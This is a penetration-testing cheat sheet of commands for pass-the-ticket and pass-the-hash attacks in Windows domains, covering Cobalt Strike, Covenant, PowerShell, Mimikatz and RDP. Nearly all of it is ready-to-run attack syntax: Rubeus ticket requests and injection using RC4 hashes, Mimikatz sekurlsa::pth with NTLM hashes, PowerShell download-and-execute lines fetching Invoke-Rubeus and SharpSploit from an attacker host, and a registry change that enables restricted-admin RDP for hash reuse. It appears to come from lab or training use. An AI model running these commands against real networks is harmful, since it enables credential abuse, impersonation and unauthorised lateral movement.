## CobaltStrike

``` a
execute-assembly C:\tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:n.lamb /rc4:REDACTED /nowrap
[System.IO.File]::WriteAllBytes("Z:\backup\PTA\CRTE\tgt-sqladmin", [System.Convert]::FromBase64String($a))
make_token CYBER\n.lamb DoesNotMatter
kerberos_ticket_use C:\Users\IEUser\Desktop\nlamb-tgt.kirbi
```

## Covenant

``` a
Rubeus asktgt /user:sqldevadmin /rc4:ce03434e2f83b99704a631ae56e2146e 
MakeToken n.lamb cyberbotic.io DoesNotMatter
Rubeus ptt /ticket:doIFXDCCBVi[...snip...]bDWN5YmVyYm90aWMuaW8=
Rubeus triage
```
## Native
``` powershell
((New-Object Net.WebClient).DownloadString('http://192.168.49.108/Invoke-SharpSploit.ps1')) | iex 
$token = [SharPsplOit.Credentials.Tokens]::new()
$token.MakeToken("user01","lab.local","something")
((New-Object Net.WebClient).DownloadString('http://192.168.49.108/Invoke-Rubeus.ps1')) | iex 
Invoke-Rubeus "asktgt /user:user01 /rc4:3b1da22b1973c0bb86d4a9b6a9ae65f6"
Invoke-Rubeus "ptt /ticket:doIFXDCCBVi[...snip...]bDWN5YmVyYm90aWMuaW8="
Invoke-Rubeus triage

```


## Mimikatz
``` a
sekurlsa::pth /user:[USER] /domain:[DOMAIN] /ntlm:[NTLM HASH] /run:"[cmd]"
sekurlsa::pth /user:sqlsvc01 /domain:DEV.FINAL.COM /ntlm:077a55c458dc4002dfdc5321a7659526 /run:"C:\Users\Public\test.exe"
Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:powershell.exe"'
```

* Fix Format 
``` bash
tr -d '\040\011\012\015'
```

## RDP
``` a
privilege::debug
sekurlsa::pth /user:[domain shorthand]\admin /domain:corp1 /ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:"mstsc.exe /restrictedadmin"
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0
```